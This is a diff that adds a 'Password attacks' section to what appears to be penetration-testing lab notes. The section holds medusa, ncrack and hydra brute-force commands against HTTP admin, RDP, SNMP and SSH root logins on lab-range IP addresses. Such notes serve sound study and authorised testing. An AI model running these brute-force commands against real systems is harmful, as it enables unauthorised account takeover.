@@ -7,6 +7,21 @@ nmap -sn 10.11.1.0/24 -oA ping+
 cat ping+.nmap | grep up -B 1 | grep for | cut -d " " -f 5  > active.txt
 for i in `cat online.txt`;do mkdir $i;done
 ```
+
+# Password attacks
+```
+# Basic HTTP
+medusa -h 10.11.1.219 -u  admin -P  password-file.txt -M  http -m DIR:/admin -T 10
+
+# RDP
+ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.35
+
+# SNMP
+hydra -P password-file.txt -v 10.11.1.219 snmp
+
+# SSH 
+hydra -l root -P password-file.txt 10.11.1.219 ssh
+```
 # Enum/Exploit
 
 ### KERB
